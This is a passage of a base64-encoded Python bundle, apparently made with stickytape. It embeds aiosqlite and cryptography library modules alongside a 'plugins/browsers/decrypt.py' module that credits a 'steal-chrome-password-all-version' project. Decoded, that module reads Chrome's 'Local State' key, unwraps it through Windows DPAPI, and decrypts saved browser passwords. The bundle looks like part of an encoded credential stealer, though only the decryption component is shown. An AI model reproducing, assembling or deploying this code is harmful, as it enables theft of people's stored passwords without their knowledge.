ZXVlLmdldF9ub3dhaXQoKVxuICAgICAgICAgICAgICAgIGlmIGxpbmUgaXMgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcbiAgICAgICAgICAgICAgICB5aWVsZCBsaW5lXG5cbiAgICAgICAgICAgIGV4Y2VwdCBFbXB0eTpcbiAgICAgICAgICAgICAgICBpZiB0YXNrLmRvbmUoKTpcbiAgICAgICAgICAgICAgICAgICAgTE9HLndhcm5pbmcoIml0ZXJkdW1wIGNvbXBsZXRlZCB1bmV4cGVjdGVkbHkiKVxuICAgICAgICAgICAgICAgICAgICBicmVha1xuXG4gICAgICAgICAgICAgICAgYXdhaXQgYXN5bmNpby5zbGVlcCgwLjAxKVxuXG4gICAgICAgIGF3YWl0IHRhc2tcblxuICAgIGFzeW5jIGRlZiBiYWNrdXAoXG4gICAgICAgIHNlbGYsXG4gICAgICAgIHRhcmdldDogVW5pb25bIkNvbm5lY3Rpb24iLCBzcWxpdGUzLkNvbm5lY3Rpb25dLFxuICAgICAgICAqLFxuICAgICAgICBwYWdlczogaW50ID0gMCxcbiAgICAgICAgcHJvZ3Jlc3M6IE9wdGlvbmFsW0NhbGxhYmxlW1tpbnQsIGludCwgaW50XSwgTm9uZV1dID0gTm9uZSxcbiAgICAgICAgbmFtZTogc3RyID0gIm1haW4iLFxuICAgICAgICBzbGVlcDogZmxvYXQgPSAwLjI1MFxuICAgICkgLT4gTm9uZTpcbiAgICAgICAgIiIiXG4gICAgICAgIE1ha2UgYSBiYWNrdXAgb2YgdGhlIGN1cnJlbnQgZGF0YWJhc2UgdG8gdGhlIHRhcmdldCBkYXRhYmFzZS5cblxuICAgICAgICBUYWtlcyBlaXRoZXIgYSBzdGFuZGFyZCBzcWxpdGUzIG9yIGFpb3NxbGl0ZSBDb25uZWN0aW9uIG9iamVjdCBhcyB0aGUgdGFyZ2V0LlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgc3lzLnZlcnNpb25faW5mbyA8ICgzLCA3KTpcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiYmFja3VwKCkgbWV0aG9kIGlzIG9ubHkgYXZhaWxhYmxlIG9uIFB5dGhvbiAzLjcrIilcblxuICAgICAgICBpZiBpc2luc3RhbmNlKHRhcmdldCwgQ29ubmVjdGlvbik6XG4gICAgICAgICAgICB0YXJnZXQgPSB0YXJnZXQuX2Nvbm5cblxuICAgICAgICBhd2FpdCBzZWxmLl9leGVjdXRlKFxuICAgICAgICAgICAgc2VsZi5fY29ubi5iYWNrdXAsXG4gICAgICAgICAgICB0YXJnZXQsXG4gICAgICAgICAgICBwYWdlcz1wYWdlcyxcbiAgICAgICAgICAgIHByb2dyZXNzPXByb2dyZXNzLFxuICAgICAgICAgICAgbmFtZT1uYW1lLFxuICAgICAgICAgICAgc2xlZXA9c2xlZXAsXG4gICAgICAgIClcblxuXG5kZWYgY29ubmVjdChcbiAgICBkYXRhYmFzZTogVW5pb25bc3RyLCBQYXRoXSxcbiAgICAqLFxuICAgIGl0ZXJfY2h1bmtfc2l6ZT02NCxcbiAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXG4gICAgKiprd2FyZ3M6IEFueVxuKSAtPiBDb25uZWN0aW9uOlxuICAgICIiIkNyZWF0ZSBhbmQgcmV0dXJuIGEgY29ubmVjdGlvbiBwcm94eSB0byB0aGUgc3FsaXRlIGRhdGFiYXNlLiIiIlxuXG4gICAgaWYgbG9vcCBpcyBub3QgTm9uZTpcbiAgICAgICAgd2FybihcbiAgICAgICAgICAgICJhaW9zcWxpdGUuY29ubmVjdCgpIG5vIGxvbmdlciB1c2VzIHRoZSBgbG9vcGAgcGFyYW1ldGVyIixcbiAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcbiAgICAgICAgKVxuXG4gICAgZGVmIGNvbm5lY3RvcigpIC0+IHNxbGl0ZTMuQ29ubmVjdGlvbjpcbiAgICAgICAgaWYgaXNpbnN0YW5jZShkYXRhYmFzZSwgc3RyKTpcbiAgICAgICAgICAgIGxvYyA9IGRhdGFiYXNlXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZShkYXRhYmFzZSwgYnl0ZXMpOlxuICAgICAgICAgICAgbG9jID0gZGF0YWJhc2UuZGVjb2RlKCJ1dGYtOCIpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBsb2MgPSBzdHIoZGF0YWJhc2UpXG5cbiAgICAgICAgcmV0dXJuIHNxbGl0ZTMuY29ubmVjdChsb2MsICoqa3dhcmdzKVxuXG4gICAgcmV0dXJuIENvbm5lY3Rpb24oY29ubmVjdG9yLCBpdGVyX2NodW5rX3NpemUpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvc3FsaXRlL2NvbnRleHQucHknLCBiJyMgQ29weXJpZ2h0IDIwMThcbiMgTGljZW5zZWQgdW5kZXIgdGhlIE1JVCBsaWNlbnNlXG5cblxuZnJvbSBmdW5jdG9vbHMgaW1wb3J0IHdyYXBzXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBDYWxsYWJsZSwgQ29yb3V0aW5lLCBHZW5lcmF0b3IsIFR5cGVWYXJcblxuZnJvbSB0eXBpbmdfZXh0ZW5zaW9ucyBpbXBvcnQgQXN5bmNDb250ZXh0TWFuYWdlclxuXG5mcm9tIC5jdXJzb3IgaW1wb3J0IEN1cnNvclxuXG5fVCA9IFR5cGVWYXIoIl9UIilcblxuXG5jbGFzcyBSZXN1bHQoQXN5bmNDb250ZXh0TWFuYWdlcltfVF0sIENvcm91dGluZVtBbnksIEFueSwgX1RdKTpcbiAgICBfX3Nsb3RzX18gPSAoIl9jb3JvIiwgIl9vYmoiKVxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvcm86IENvcm91dGluZVtBbnksIEFueSwgX1RdKTpcbiAgICAgICAgc2VsZi5fY29ybyA9IGNvcm9cbiAgICAgICAgc2VsZi5fb2JqOiBfVFxuXG4gICAgZGVmIHNlbmQoc2VsZiwgdmFsdWUpIC0+IE5vbmU6XG4gICAgICAgIHJldHVybiBzZWxmLl9jb3JvLnNlbmQodmFsdWUpXG5cbiAgICBkZWYgdGhyb3coc2VsZiwgdHlwLCB2YWw9Tm9uZSwgdGI9Tm9uZSkgLT4gTm9uZTpcbiAgICAgICAgaWYgdmFsIGlzIE5vbmU6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fY29yby50aHJvdyh0eXApXG5cbiAgICAgICAgaWYgdGIgaXMgTm9uZTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9jb3JvLnRocm93KHR5cCwgdmFsKVxuXG4gICAgICAgIHJldHVybiBzZWxmLl9jb3JvLnRocm93KHR5cCwgdmFsLCB0YilcblxuICAgIGRlZiBjbG9zZShzZWxmKSAtPiBOb25lOlxuICAgICAgICByZXR1cm4gc2VsZi5fY29yby5jbG9zZSgpXG5cbiAgICBkZWYgX19hd2FpdF9fKHNlbGYpIC0+IEdlbmVyYXRvcltBbnksIE5vbmUsIF9UXTpcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvcm8uX19hd2FpdF9fKClcblxuICAgIGFzeW5jIGRlZiBfX2FlbnRlcl9fKHNlbGYpIC0+IF9UOlxuICAgICAgICBzZWxmLl9vYmogPSBhd2FpdCBzZWxmLl9jb3JvXG4gICAgICAgIHJldHVybiBzZWxmLl9vYmpcblxuICAgIGFzeW5jIGRlZiBfX2FleGl0X18oc2VsZiwgZXhjX3R5cGUsIGV4YywgdGIpIC0+IE5vbmU6XG4gICAgICAgIGlmIGlzaW5zdGFuY2Uoc2VsZi5fb2JqLCBDdXJzb3IpOlxuICAgICAgICAgICAgYXdhaXQgc2VsZi5fb2JqLmNsb3NlKClcblxuXG5kZWYgY29udGV4dG1hbmFnZXIoXG4gICAgbWV0aG9kOiBDYWxsYWJsZVsuLi4sIENvcm91dGluZVtBbnksIEFueSwgX1RdXVxuKSAtPiBDYWxsYWJsZVsuLi4sIFJlc3VsdFtfVF1dOlxuICAgIEB3cmFwcyhtZXRob2QpXG4gICAgZGVmIHdyYXBwZXIoc2VsZiwgKmFyZ3MsICoqa3dhcmdzKSAtPiBSZXN1bHRbX1RdOlxuICAgICAgICByZXR1cm4gUmVzdWx0KG1ldGhvZChzZWxmLCAqYXJncywgKiprd2FyZ3MpKVxuXG4gICAgcmV0dXJuIHdyYXBwZXJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9zcWxpdGUvY3Vyc29yLnB5JywgYicjIENvcHlyaWdodCAyMDE4IEpvaG4gUmVlc2VcbiMgTGljZW5zZWQgdW5kZXIgdGhlIE1JVCBsaWNlbnNlXG5cbmltcG9ydCBzcWxpdGUzXG5mcm9tIHR5cGluZyBpbXBvcnQgVFlQRV9DSEVDS0lORywgQW55LCBBc3luY0l0ZXJhdG9yLCBJdGVyYWJsZSwgT3B0aW9uYWwsIFR1cGxlXG5cbmlmIFRZUEVfQ0hFQ0tJTkc6XG4gICAgZnJvbSAuY29yZSBpbXBvcnQgQ29ubmVjdGlvblxuXG5cbmNsYXNzIEN1cnNvcjpcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29ubjogIkNvbm5lY3Rpb24iLCBjdXJzb3I6IHNxbGl0ZTMuQ3Vyc29yKSAtPiBOb25lOlxuICAgICAgICBzZWxmLml0ZXJfY2h1bmtfc2l6ZSA9IGNvbm4uX2l0ZXJfY2h1bmtfc2l6ZVxuICAgICAgICBzZWxmLl9jb25uID0gY29ublxuICAgICAgICBzZWxmLl9jdXJzb3IgPSBjdXJzb3JcblxuICAgIGRlZiBfX2FpdGVyX18oc2VsZikgLT4gQXN5bmNJdGVyYXRvcltzcWxpdGUzLlJvd106XG4gICAgICAgICIiIlRoZSBjdXJzb3IgcHJveHkgaXMgYWxzbyBhbiBhc3luYyBpdGVyYXRvci4iIiJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2ZldGNoX2NodW5rZWQoKVxuXG4gICAgYXN5bmMgZGVmIF9mZXRjaF9jaHVua2VkKHNlbGYpOlxuICAgICAgICB3aGlsZSBUcnVlOlxuICAgICAgICAgICAgcm93cyA9IGF3YWl0IHNlbGYuZmV0Y2htYW55KHNlbGYuaXRlcl9jaHVua19zaXplKVxuICAgICAgICAgICAgaWYgbm90IHJvd3M6XG4gICAgICAgICAgICAgICAgcmV0dXJuXG4gICAgICAgICAgICBmb3Igcm93IGluIHJvd3M6XG4gICAgICAgICAgICAgICAgeWllbGQgcm93XG5cbiAgICBhc3luYyBkZWYgX2V4ZWN1dGUoc2VsZiwgZm4sICphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgICIiIkV4ZWN1dGUgdGhlIGdpdmVuIGZ1bmN0aW9uIG9uIHRoZSBzaGFyZWQgY29ubmVjdGlvblwncyB0aHJlYWQuIiIiXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9jb25uLl9leGVjdXRlKGZuLCAqYXJncywgKiprd2FyZ3MpXG5cbiAgICBhc3luYyBkZWYgZXhlY3V0ZShzZWxmLCBzcWw6IHN0ciwgcGFyYW1ldGVyczogSXRlcmFibGVbQW55XSA9IE5vbmUpIC0+ICJDdXJzb3IiOlxuICAgICAgICAiIiJFeGVjdXRlIHRoZSBnaXZlbiBxdWVyeS4iIiJcbiAgICAgICAgaWYgcGFyYW1ldGVycyBpcyBOb25lOlxuICAgICAgICAgICAgcGFyYW1ldGVycyA9IFtdXG4gICAgICAgIGF3YWl0IHNlbGYuX2V4ZWN1dGUoc2VsZi5fY3Vyc29yLmV4ZWN1dGUsIHNxbCwgcGFyYW1ldGVycylcbiAgICAgICAgcmV0dXJuIHNlbGZcblxuICAgIGFzeW5jIGRlZiBleGVjdXRlbWFueShcbiAgICAgICAgc2VsZiwgc3FsOiBzdHIsIHBhcmFtZXRlcnM6IEl0ZXJhYmxlW0l0ZXJhYmxlW0FueV1dXG4gICAgKSAtPiAiQ3Vyc29yIjpcbiAgICAgICAgIiIiRXhlY3V0ZSB0aGUgZ2l2ZW4gbXVsdGlxdWVyeS4iIiJcbiAgICAgICAgYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jdXJzb3IuZXhlY3V0ZW1hbnksIHNxbCwgcGFyYW1ldGVycylcbiAgICAgICAgcmV0dXJuIHNlbGZcblxuICAgIGFzeW5jIGRlZiBleGVjdXRlc2NyaXB0KHNlbGYsIHNxbF9zY3JpcHQ6IHN0cikgLT4gIkN1cnNvciI6XG4gICAgICAgICIiIkV4ZWN1dGUgYSB1c2VyIHNjcmlwdC4iIiJcbiAgICAgICAgYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jdXJzb3IuZXhlY3V0ZXNjcmlwdCwgc3FsX3NjcmlwdClcbiAgICAgICAgcmV0dXJuIHNlbGZcblxuICAgIGFzeW5jIGRlZiBmZXRjaG9uZShzZWxmKSAtPiBPcHRpb25hbFtzcWxpdGUzLlJvd106XG4gICAgICAgICIiIkZldGNoIGEgc2luZ2xlIHJvdy4iIiJcbiAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX2V4ZWN1dGUoc2VsZi5fY3Vyc29yLmZldGNob25lKVxuXG4gICAgYXN5bmMgZGVmIGZldGNobWFueShzZWxmLCBzaXplOiBpbnQgPSBOb25lKSAtPiBJdGVyYWJsZVtzcWxpdGUzLlJvd106XG4gICAgICAgICIiIkZldGNoIHVwIHRvIGBjdXJzb3IuYXJyYXlzaXplYCBudW1iZXIgb2Ygcm93cy4iIiJcbiAgICAgICAgYXJnczogVHVwbGVbaW50LCAuLi5dID0gKClcbiAgICAgICAgaWYgc2l6ZSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIGFyZ3MgPSAoc2l6ZSwpXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9leGVjdXRlKHNlbGYuX2N1cnNvci5mZXRjaG1hbnksICphcmdzKVxuXG4gICAgYXN5bmMgZGVmIGZldGNoYWxsKHNlbGYpIC0+IEl0ZXJhYmxlW3NxbGl0ZTMuUm93XTpcbiAgICAgICAgIiIiRmV0Y2ggYWxsIHJlbWFpbmluZyByb3dzLiIiIlxuICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jdXJzb3IuZmV0Y2hhbGwpXG5cbiAgICBhc3luYyBkZWYgY2xvc2Uoc2VsZikgLT4gTm9uZTpcbiAgICAgICAgIiIiQ2xvc2UgdGhlIGN1cnNvci4iIiJcbiAgICAgICAgYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jdXJzb3IuY2xvc2UpXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgcm93Y291bnQoc2VsZikgLT4gaW50OlxuICAgICAgICByZXR1cm4gc2VsZi5fY3Vyc29yLnJvd2NvdW50XG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgbGFzdHJvd2lkKHNlbGYpIC0+IGludDpcbiAgICAgICAgcmV0dXJuIHNlbGYuX2N1cnNvci5sYXN0cm93aWRcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBhcnJheXNpemUoc2VsZikgLT4gaW50OlxuICAgICAgICByZXR1cm4gc2VsZi5fY3Vyc29yLmFycmF5c2l6ZVxuXG4gICAgQGFycmF5c2l6ZS5zZXR0ZXJcbiAgICBkZWYgYXJyYXlzaXplKHNlbGYsIHZhbHVlOiBpbnQpIC0+IE5vbmU6XG4gICAgICAgIHNlbGYuX2N1cnNvci5hcnJheXNpemUgPSB2YWx1ZVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGRlc2NyaXB0aW9uKHNlbGYpIC0+IFR1cGxlW1R1cGxlXTpcbiAgICAgICAgcmV0dXJuIHNlbGYuX2N1cnNvci5kZXNjcmlwdGlvblxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGNvbm5lY3Rpb24oc2VsZikgLT4gc3FsaXRlMy5Db25uZWN0aW9uOlxuICAgICAgICByZXR1cm4gc2VsZi5fY3Vyc29yLmNvbm5lY3Rpb25cblxuICAgIGFzeW5jIGRlZiBfX2FlbnRlcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgYXN5bmMgZGVmIF9fYWV4aXRfXyhzZWxmLCBleGNfdHlwZSwgZXhjX3ZhbCwgZXhjX3RiKTpcbiAgICAgICAgYXdhaXQgc2VsZi5jbG9zZSgpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgncGx1Z2lucy9icm93c2Vycy9kZWNyeXB0LnB5JywgYicjIGh0dHBzOi8vZ2l0aHViLmNvbS9oYWthbm9ueW1vcy9zdGVhbC1jaHJvbWUtcGFzc3dvcmQtYWxsLXZlcnNpb24vYmxvYi9tYXN0ZXIvbG9jYWwucHlcclxuXHJcblxyXG5pbXBvcnQgY3R5cGVzXHJcbmltcG9ydCBjdHlwZXMud2ludHlwZXNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmRcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgKFxyXG4gICAgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcylcclxuaW1wb3J0IGJhc2U2NFxyXG5pbXBvcnQgb3NcclxuaW1wb3J0IGpzb25cclxuXHJcblxyXG5jbGFzcyBEZWNyeXB0b3I6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgcGF0aCkgLT4gTm9uZTpcclxuICAgICAgICBpZiBwYXRoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYucGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uW1wnTE9DQUxBUFBEQVRBXCddLCByIkdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXExvY2FsIFN0YXRlIilcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLnBhdGggPSBwYXRoXHJcbiAgICAgICAgXHJcbiAgICAgICAgc2VsZi5rZXkgPSBOb25lXHJcbiAgICAgICAgc2VsZi5jaXBoZXIgPSBOb25lXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGRwYXBpX2RlY3J5cHQoZW5jcnlwdGVkKTpcclxuICAgICAgICBjbGFzcyBEQVRBX0JMT0IoY3R5cGVzLlN0cnVjdHVyZSk6XHJcbiAgICAgICAgICAgIF9maWVsZHNfID0gWyhcJ2NiRGF0YVwnLCBjdHlwZXMud2ludHlwZXMuRFdPUkQpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAoXCdwYkRhdGFcJywgY3R5cGVzLlBPSU5URVIoY3R5cGVzLmNfY2hhcikpXVxyXG5cclxuICAgICAgICBwID0gY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKGVuY3J5cHRlZCwgbGVuKGVuY3J5cHRlZCkpXHJcbiAgICAgICAgYmxvYmluID0gREFUQV9CTE9CKGN0eXBlcy5zaXplb2YocCksIHApXHJcbiAgICAgICAgYmxvYm91dCA9IERBVEFfQkxPQigpXHJcbiAgICAgICAgcmV0dmFsID0gY3R5cGVzLndpbmRsbC5jcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YShcclxuICAgICAgICAgICAgY3R5cGVzLmJ5cmVmKGJsb2JpbiksIE5vbmUsIE5vbmUsIE5vbmUsIE5vbmUsIDAsIGN0eXBlcy5ieXJlZihibG9ib3V0KSlcclxuICAgICAgICBpZiBub3QgcmV0dmFsOlxyXG4gICAgICAgICAgICByYWlzZSBjdHlwZXMuV2luRXJyb3IoKVxyXG4gICAgICAgIHJlc3VsdCA9IGN0eXBlcy5zdHJpbmdfYXQoYmxvYm91dC5wYkRhdGEsIGJsb2JvdXQuY2JEYXRhKVxyXG4gICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKGJsb2JvdXQucGJEYXRhKVxyXG4gICAgICAgIHJldHVybiByZXN1bHRcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZGVjcnlwdChjaXBoZXIsIGNpcGhlcnRleHQsIG5vbmNlKTpcclxuICAgICAgICBjaXBoZXIubW9kZSA9IG1vZGVzLkdDTShub25jZSlcclxuICAgICAgICBkZWNyeXB0b3IgPSBjaXBoZXIuZGVjcnlwdG9yKClcclxuICAgICAgICByZXR1cm4gZGVjcnlwdG9yLnVwZGF0ZShjaXBoZXJ0ZXh0KVxyXG5cclxuICAgIGRlZiBnZXRfa2V5X2Zyb21fbG9jYWxfc3RhdGUoc2VsZik6XHJcbiAgICAgICAganNuID0gTm9uZVxyXG4gICAgICAgIHdpdGggb3BlbihzZWxmLnBhdGgsIFwnclwnKSBhcyBmOlxyXG4gICAgICAgICAgICBqc24gPSBqc29uLmxvYWRzKHN0cihmLnJlYWRsaW5lKCkpKVxyXG4gICAgICAgIHJldHVybiBqc25bXCdvc19jcnlwdFwnXVtcJ2VuY3J5cHRlZF9rZXlcJ11cclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X2NpcGhlcihrZXkpOlxyXG4gICAgICAgIGNpcGhlciA9IENpcGhlcihcclxuICAgICAgICAgICAgYWxnb3JpdGhtcy5BRVMoa2V5KSxcclxuICAgICAgICAgICAgTm9uZSxcclxuICAgICAgICAgICAgYmFja2VuZD1kZWZhdWx0X2JhY2tlbmQoKVxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gY2lwaGVyXHJcblxyXG4gICAgZGVmIGFlc19kZWNyeXB0KHNlbGYsIGVuY3J5cHRlZF90eHQpOlxyXG4gICAgICAgIGlmIHNlbGYua2V5IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGVuY29kZWRfa2V5ID0gc2VsZi5nZXRfa2V5X2Zyb21fbG9jYWxfc3RhdGUoKVxyXG4gICAgICAgICAgICBlbmNyeXB0ZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShlbmNvZGVkX2tleS5lbmNvZGUoKSlcclxuICAgICAgICAgICAgZW5jcnlwdGVkX2tleSA9IGVuY3J5cHRlZF9rZXlbNTpdXHJcbiAgICAgICAgICAgIHNlbGYua2V5ID0gRGVjcnlwdG9yLmRwYXBpX2RlY3J5cHQoZW5jcnlwdGVkX2tleSlcclxuICAgICAgICAgICAgc2VsZi5jaXBoZXIgPSBEZWNyeXB0b3IuZ2V0X2NpcGhlcihzZWxmLmtleSlcclxuICAgICAgICBcclxuICAgICAgICBub25jZSA9IGVuY3J5cHRlZF90eHRbMzoxNV1cclxuXHJcbiAgICAgICAgcmV0dXJuIERlY3J5cHRvci5kZWNyeXB0KHNlbGYuY2lwaGVyLGVuY3J5cHRlZF90eHRbMTU6XSxub25jZSlcclxuXHJcbiAgICBkZWYgZGVjcnlwdF9wYXNzd29yZChzZWxmLCBkYXRhKTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIGRhdGFbOjRdID09IGJcJ1xceDAxXFx4MDBcXHgwMFxceDAwXCc6XHJcbiAgICAgICAgICAgICAgICBkZWNyeXB0ZWQgPSBEZWNyeXB0b3IuZHBhcGlfZGVjcnlwdChkYXRhKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZC5kZWNvZGUoKVxyXG4gICAgICAgICAgICBlbGlmIGRhdGFbOjNdID09IGJcJ3YxMFwnOlxyXG4gICAgICAgICAgICAgICAgZGVjcnlwdGVkID0gc2VsZi5hZXNfZGVjcnlwdChkYXRhKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZFs6LTE2XS5kZWNvZGUoKVxyXG4gICAgICAgIGV4Y2VwdDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmUnKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L19faW5pdF9fLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IHN5c1xyXG5pbXBvcnQgd2FybmluZ3NcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5Ll9fYWJvdXRfXyBpbXBvcnQgKFxyXG4gICAgX19hdXRob3JfXyxcclxuICAgIF9fY29weXJpZ2h0X18sXHJcbiAgICBfX3ZlcnNpb25fXyxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS51dGlscyBpbXBvcnQgQ3J5cHRvZ3JhcGh5RGVwcmVjYXRpb25XYXJuaW5nXHJcblxyXG5cclxuX19hbGxfXyA9IFtcclxuICAgICJfX3ZlcnNpb25fXyIsXHJcbiAgICAiX19hdXRob3JfXyIsXHJcbiAgICAiX19jb3B5cmlnaHRfXyIsXHJcbl1cclxuXHJcbmlmIHN5cy52ZXJzaW9uX2luZm9bOjJdID09ICgzLCA2KTpcclxuICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgIlB5dGhvbiAzLjYgaXMgbm8gbG9uZ2VyIHN1cHBvcnRlZCBieSB0aGUgUHl0aG9uIGNvcmUgdGVhbS4gIlxyXG4gICAgICAgICJUaGVyZWZvcmUsIHN1cHBvcnQgZm9yIGl0IGlzIGRlcHJlY2F0ZWQgaW4gY3J5cHRvZ3JhcGh5IGFuZCB3aWxsIGJlIlxyXG4gICAgICAgICIgcmVtb3ZlZCBpbiBhIGZ1dHVyZSByZWxlYXNlLiIsXHJcbiAgICAgICAgQ3J5cHRvZ3JhcGh5RGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgIHN0YWNrbGV2ZWw9MixcclxuICAgIClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9fX2Fib3V0X18ucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuX19hbGxfXyA9IFtcclxuICAgICJfX3ZlcnNpb25fXyIsXHJcbiAgICAiX19hdXRob3JfXyIsXHJcbiAgICAiX19jb3B5cmlnaHRfXyIsXHJcbl1cclxuXHJcbl9fdmVyc2lvbl9fID0gIjM3LjAuMiJcclxuXHJcbl9fYXV0aG9yX18gPSAiVGhlIFB5dGhvbiBDcnlwdG9ncmFwaGljIEF1dGhvcml0eSBhbmQgaW5kaXZpZHVhbCBjb250cmlidXRvcnMiXHJcbl9fY29weXJpZ2h0X18gPSAiQ29weXJpZ2h0IDIwMTMtMjAyMSB7fSIuZm9ybWF0KF9fYXV0aG9yX18pXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvdXRpbHMucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5pbXBvcnQgZW51bVxyXG5pbXBvcnQgaW5zcGVjdFxyXG5pbXBvcnQgc3lzXHJcbmltcG9ydCB0eXBlc1xyXG5pbXBvcnQgdHlwaW5nXHJcbmltcG9ydCB3YXJuaW5nc1xyXG5cclxuXHJcbiMgV2UgdXNlIGEgVXNlcldhcm5pbmcgc3ViY2xhc3MsIGluc3RlYWQgb2YgRGVwcmVjYXRpb25XYXJuaW5nLCBiZWNhdXNlIENQeXRob25cclxuIyBkZWNpZGVkIGRlcHJlY2F0aW9uIHdhcm5pbmdzIHNob3VsZCBiZSBpbnZpc2JsZSBieSBkZWZhdWx0LlxyXG5jbGFzcyBDcnlwdG9ncmFwaHlEZXByZWNhdGlvbldhcm5pbmcoVXNlcldhcm5pbmcpOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbiMgU2V2ZXJhbCBBUElzIHdlcmUgZGVwcmVjYXRlZCB3aXRoIG5vIHNwZWNpZmljIGVuZC1vZi1saWZlIGRhdGUgYmVjYXVzZSBvZiB0aGVcclxuIyB1YmlxdWl0eSBvZiB0aGVpciB1c2UuIFRoZXkgc2hvdWxkIG5vdCBiZSByZW1vdmVkIHVudGlsIHdlIGFncmVlIG9uIHdoZW4gdGhhdFxyXG4jIGN5Y2xlIGVuZHMuXHJcblBlcnNpc3RlbnRseURlcHJlY2F0ZWQyMDE5ID0gQ3J5cHRvZ3JhcGh5RGVwcm